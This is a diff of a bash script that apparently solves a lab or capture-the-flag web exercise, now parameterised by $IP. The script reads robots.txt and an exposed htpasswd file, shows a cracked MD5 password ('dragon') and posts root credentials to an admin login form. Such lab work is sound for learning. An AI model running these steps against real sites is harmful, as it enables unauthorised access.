@@ -1,8 +1,8 @@
 #!/bin/bash
-curl "http://10.0.2.15/robots.txt" -v 
-curl "http://10.0.2.15/whatever/" -v 
-curl "http://10.0.2.15/whatever/htpasswd" -v 
+curl "http://$IP/robots.txt" -v 
+curl "http://$IP/whatever/" -v 
+curl "http://$IP/whatever/htpasswd" -v 
 
 echo "8621ffdbc5698829397d97767ac13db3 MD5 : dragon"
 
-curl "http://10.0.2.15/admin/" --data "username=root&password=dragon&Login=Login"
+curl "http://$IP/admin/" --data "username=root&password=dragon&Login=Login"
